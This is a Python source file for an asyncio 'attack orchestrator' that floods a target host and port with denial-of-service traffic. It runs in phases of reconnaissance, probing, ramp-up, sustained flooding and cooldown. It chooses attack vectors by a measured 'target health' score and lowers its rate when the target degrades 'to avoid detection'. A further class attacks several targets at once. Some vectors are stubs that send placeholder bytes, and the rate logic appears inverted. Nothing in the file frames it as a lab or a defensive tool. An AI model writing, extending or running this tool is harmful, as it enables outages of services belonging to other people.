"""
Intelligent Attack Orchestrator

Coordinates multi-vector attacks with:
- Automatic attack selection
- Real-time adaptation
- Resource optimization
- Target response analysis
"""

import asyncio
import time
import random
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Callable, Type
from enum import Enum
from collections import deque
import logging

logger = logging.getLogger(__name__)


class AttackPhase(Enum):
    """Attack phases"""
    RECON = "reconnaissance"
    PROBE = "probe"
    RAMP = "ramp_up"
    SUSTAIN = "sustain"
    ADAPT = "adapt"
    COOLDOWN = "cooldown"


class AttackVector(Enum):
    """Attack vectors"""
    VOLUMETRIC = "volumetric"
    PROTOCOL = "protocol"
    APPLICATION = "application"
    AMPLIFICATION = "amplification"
    SLOWLORIS = "slowloris"
    SSL = "ssl"


@dataclass
class AttackConfig:
    """Attack configuration"""
    target: str
    port: int
    duration: int = 300
    vectors: List[AttackVector] = field(default_factory=lambda: [AttackVector.VOLUMETRIC])
    max_rate: int = 100000
    adaptive: bool = True
    phases: List[AttackPhase] = field(default_factory=lambda: [
        AttackPhase.RECON, AttackPhase.PROBE, AttackPhase.RAMP,
        AttackPhase.SUSTAIN, AttackPhase.COOLDOWN
    ])


@dataclass
class AttackMetrics:
    """Real-time attack metrics"""
    requests_sent: int = 0
    bytes_sent: int = 0
    responses_received: int = 0
    errors: int = 0
    current_rate: float = 0.0
    avg_response_time: float = 0.0
    success_rate: float = 0.0
    target_health: float = 1.0  # 1.0 = healthy, 0.0 = down
    start_time: float = field(default_factory=time.time)
    
    def update(self, sent: int = 0, received: int = 0, errors: int = 0, 
               response_time: float = 0.0, bytes_sent: int = 0):
        self.requests_sent += sent
        self.responses_received += received
        self.errors += errors
        self.bytes_sent += bytes_sent
        
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            self.current_rate = self.requests_sent / elapsed
            
        total = self.responses_received + self.errors
        if total > 0:
            self.success_rate = self.responses_received / total
            
        if response_time > 0:
            # Exponential moving average
            self.avg_response_time = 0.9 * self.avg_response_time + 0.1 * response_time


class TargetAnalyzer:
    """Analyzes target response to optimize attack"""
    
    def __init__(self, window_size: int = 100):
        self.window_size = window_size
        self._response_times: deque = deque(maxlen=window_size)
        self._error_rates: deque = deque(maxlen=window_size)
        self._status_codes: Dict[int, int] = {}
        
    def record_response(self, response_time: float, status_code: int = 200, error: bool = False):
        """Record a response"""
        self._response_times.append(response_time)
        self._error_rates.append(1 if error else 0)
        self._status_codes[status_code] = self._status_codes.get(status_code, 0) + 1
        
    def get_health_score(self) -> float:
        """Calculate target health score (0-1)"""
        if not self._response_times:
            return 1.0
            
        # Factors: response time, error rate, status codes
        avg_response = sum(self._response_times) / len(self._response_times)
        error_rate = sum(self._error_rates) / len(self._error_rates) if self._error_rates else 0
        
        # Normalize response time (assume >5s is unhealthy)
        response_score = max(0, 1 - (avg_response / 5.0))
        
        # Error rate directly impacts health
        error_score = 1 - error_rate
        
        # 5xx errors indicate server stress
        total_responses = sum(self._status_codes.values())
        if total_responses > 0:
            server_errors = sum(v for k, v in self._status_codes.items() if 500 <= k < 600)
            server_error_rate = server_errors / total_responses
            server_score = 1 - server_error_rate
        else:
            server_score = 1.0
            
        return (response_score + error_score + server_score) / 3
        
    def recommend_vector(self) -> AttackVector:
        """Recommend best attack vector based on target behavior"""
        health = self.get_health_score()
        
        if health > 0.8:
            # Target is healthy - need more aggressive attack
            return random.choice([AttackVector.VOLUMETRIC, AttackVector.AMPLIFICATION])
        elif health > 0.5:
            # Target is stressed - application layer might be effective
            return random.choice([AttackVector.APPLICATION, AttackVector.PROTOCOL])
        else:
            # Target is struggling - maintain pressure
            return random.choice([AttackVector.SLOWLORIS, AttackVector.SSL])
            
    def recommend_rate(self, current_rate: float) -> float:
        """Recommend attack rate adjustment"""
        health = self.get_health_score()
        
        if health > 0.9:
            # Target handling well - increase rate
            return current_rate * 1.5
        elif health > 0.7:
            # Some impact - slight increase
            return current_rate * 1.2
        elif health > 0.5:
            # Good impact - maintain
            return current_rate
        elif health > 0.3:
            # Heavy impact - slight decrease to avoid detection
            return current_rate * 0.9
        else:
            # Target struggling - reduce to avoid complete outage
            return current_rate * 0.7


class AttackOrchestrator:
    """
    Intelligent Attack Orchestrator
    
    Coordinates multiple attack vectors with real-time adaptation.
    """
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.metrics = AttackMetrics()
        self.analyzer = TargetAnalyzer()
        self._running = False
        self._current_phase = AttackPhase.RECON
        self._active_attacks: List[asyncio.Task] = []
        self._rate_multiplier = 1.0
        
    async def start(self):
        """Start orchestrated attack"""
        self._running = True
        self.metrics = AttackMetrics()
        
        logger.info(f"Starting orchestrated attack on {self.config.target}:{self.config.port}")
        logger.info(f"Vectors: {[v.value for v in self.config.vectors]}")
        logger.info(f"Duration: {self.config.duration}s")
        
        try:
            for phase in self.config.phases:
                if not self._running:
                    break
                    
                self._current_phase = phase
                logger.info(f"Entering phase: {phase.value}")
                
                await self._execute_phase(phase)
                
        except Exception as e:
            logger.error(f"Orchestrator error: {e}")
        finally:
            await self._cleanup()
            
        self._running = False
        return self.get_report()
        
    async def stop(self):
        """Stop attack"""
        self._running = False
        for task in self._active_attacks:
            task.cancel()
            
    async def _execute_phase(self, phase: AttackPhase):
        """Execute attack phase"""
        if phase == AttackPhase.RECON:
            await self._phase_recon()
        elif phase == AttackPhase.PROBE:
            await self._phase_probe()
        elif phase == AttackPhase.RAMP:
            await self._phase_ramp()
        elif phase == AttackPhase.SUSTAIN:
            await self._phase_sustain()
        elif phase == AttackPhase.ADAPT:
            await self._phase_adapt()
        elif phase == AttackPhase.COOLDOWN:
            await self._phase_cooldown()

    async def _phase_recon(self):
        """Reconnaissance phase - gather target info"""
        logger.info("Performing reconnaissance...")
        
        # Quick port check
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.config.target, self.config.port),
                timeout=5
            )
            
            # Measure baseline response time
            start = time.monotonic()
            writer.write(b'GET / HTTP/1.1\r\nHost: test\r\n\r\n')
            await writer.drain()
            
            try:
                await asyncio.wait_for(reader.read(1024), timeout=5)
                baseline_time = time.monotonic() - start
                self.analyzer.record_response(baseline_time, 200)
                logger.info(f"Baseline response time: {baseline_time:.3f}s")
            except asyncio.TimeoutError:
                logger.info("Target slow to respond")
                
            writer.close()
            
        except Exception as e:
            logger.warning(f"Recon failed: {e}")
            
    async def _phase_probe(self):
        """Probe phase - test different vectors"""
        logger.info("Probing attack vectors...")
        
        probe_duration = min(10, self.config.duration // 10)
        
        for vector in self.config.vectors:
            if not self._running:
                break
                
            logger.info(f"Testing vector: {vector.value}")
            
            # Run short test
            task = asyncio.create_task(self._run_vector(vector, probe_duration, rate=1000))
            self._active_attacks.append(task)
            
            try:
                await asyncio.wait_for(task, timeout=probe_duration + 5)
            except asyncio.TimeoutError:
                task.cancel()
                
            # Analyze effectiveness
            health = self.analyzer.get_health_score()
            logger.info(f"Vector {vector.value} - Target health: {health:.2f}")
            
            await asyncio.sleep(1)  # Brief pause between probes
            
    async def _phase_ramp(self):
        """Ramp up phase - gradually increase intensity"""
        logger.info("Ramping up attack...")
        
        ramp_duration = min(30, self.config.duration // 5)
        steps = 10
        step_duration = ramp_duration / steps
        
        for i in range(steps):
            if not self._running:
                break
                
            rate = int(self.config.max_rate * (i + 1) / steps)
            self._rate_multiplier = (i + 1) / steps
            
            logger.info(f"Ramp step {i+1}/{steps} - Rate: {rate}")
            
            # Start attacks at current rate
            tasks = []
            for vector in self.config.vectors:
                task = asyncio.create_task(
                    self._run_vector(vector, step_duration, rate=rate // len(self.config.vectors))
                )
                tasks.append(task)
                self._active_attacks.append(task)
                
            await asyncio.sleep(step_duration)
            
            # Cancel tasks for next step
            for task in tasks:
                task.cancel()
                
    async def _phase_sustain(self):
        """Sustain phase - maintain attack at full intensity"""
        logger.info("Sustaining attack...")
        
        sustain_duration = self.config.duration - 60  # Reserve time for other phases
        
        # Start all vectors
        tasks = []
        for vector in self.config.vectors:
            rate = self.config.max_rate // len(self.config.vectors)
            task = asyncio.create_task(
                self._run_vector(vector, sustain_duration, rate=rate)
            )
            tasks.append(task)
            self._active_attacks.append(task)
            
        # Monitor and adapt
        start = time.time()
        while self._running and (time.time() - start) < sustain_duration:
            await asyncio.sleep(5)
            
            if self.config.adaptive:
                await self._adapt_attack()
                
        # Cancel tasks
        for task in tasks:
            task.cancel()
            
    async def _phase_adapt(self):
        """Adaptation phase - adjust based on target response"""
        await self._adapt_attack()
        
    async def _phase_cooldown(self):
        """Cooldown phase - gradually reduce intensity"""
        logger.info("Cooling down...")
        
        cooldown_duration = min(10, self.config.duration // 10)
        
        # Gradually reduce rate
        for i in range(5, 0, -1):
            if not self._running:
                break
                
            rate = int(self.config.max_rate * i / 10)
            logger.info(f"Cooldown - Rate: {rate}")
            
            await asyncio.sleep(cooldown_duration / 5)
            
    async def _adapt_attack(self):
        """Adapt attack based on target response"""
        health = self.analyzer.get_health_score()
        
        logger.info(f"Target health: {health:.2f}")
        
        # Recommend rate adjustment
        current_rate = self.metrics.current_rate
        recommended_rate = self.analyzer.recommend_rate(current_rate)
        
        if abs(recommended_rate - current_rate) / max(current_rate, 1) > 0.1:
            logger.info(f"Adjusting rate: {current_rate:.0f} -> {recommended_rate:.0f}")
            self._rate_multiplier = recommended_rate / self.config.max_rate
            
        # Recommend vector change
        if health > 0.8:
            recommended_vector = self.analyzer.recommend_vector()
            if recommended_vector not in self.config.vectors:
                logger.info(f"Recommending additional vector: {recommended_vector.value}")
                
    async def _run_vector(self, vector: AttackVector, duration: float, rate: int):
        """Run a specific attack vector"""
        start = time.time()
        interval = 1.0 / max(rate, 1)
        
        while self._running and (time.time() - start) < duration:
            try:
                # Send attack based on vector type
                response_time = await self._send_attack(vector)
                
                self.metrics.update(sent=1, received=1, response_time=response_time)
                self.analyzer.record_response(response_time, 200)
                
            except Exception as e:
                self.metrics.update(sent=1, errors=1)
                self.analyzer.record_response(0, 0, error=True)
                
            await asyncio.sleep(interval * self._rate_multiplier)
            
    async def _send_attack(self, vector: AttackVector) -> float:
        """Send single attack and return response time"""
        start = time.monotonic()
        
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.config.target, self.config.port),
                timeout=5
            )
            
            # Send based on vector
            if vector == AttackVector.VOLUMETRIC:
                writer.write(b'X' * 1024)
            elif vector == AttackVector.APPLICATION:
                writer.write(b'GET / HTTP/1.1\r\nHost: test\r\n\r\n')
            elif vector == AttackVector.PROTOCOL:
                writer.write(b'\x00' * 64)
            else:
                writer.write(b'TEST')
                
            await writer.drain()
            
            try:
                await asyncio.wait_for(reader.read(1024), timeout=2)
            except asyncio.TimeoutError:
                pass
                
            writer.close()
            
        except Exception:
            raise
            
        return time.monotonic() - start
        
    async def _cleanup(self):
        """Cleanup resources"""
        for task in self._active_attacks:
            if not task.done():
                task.cancel()
                
        self._active_attacks.clear()
        
    def get_report(self) -> Dict[str, Any]:
        """Get attack report"""
        elapsed = time.time() - self.metrics.start_time
        
        return {
            'target': f"{self.config.target}:{self.config.port}",
            'duration': elapsed,
            'vectors': [v.value for v in self.config.vectors],
            'requests_sent': self.metrics.requests_sent,
            'bytes_sent': self.metrics.bytes_sent,
            'avg_rate': self.metrics.requests_sent / elapsed if elapsed > 0 else 0,
            'success_rate': self.metrics.success_rate,
            'target_health': self.analyzer.get_health_score(),
            'errors': self.metrics.errors,
        }


class MultiTargetOrchestrator:
    """Orchestrate attacks against multiple targets"""
    
    def __init__(self, targets: List[AttackConfig]):
        self.targets = targets
        self.orchestrators: List[AttackOrchestrator] = []
        self._running = False
        
    async def start(self):
        """Start multi-target attack"""
        self._running = True
        
        # Create orchestrators
        self.orchestrators = [AttackOrchestrator(config) for config in self.targets]
        
        # Start all attacks
        tasks = [orch.start() for orch in self.orchestrators]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        self._running = False
        return results
        
    async def stop(self):
        """Stop all attacks"""
        self._running = False
        for orch in self.orchestrators:
            await orch.stop()
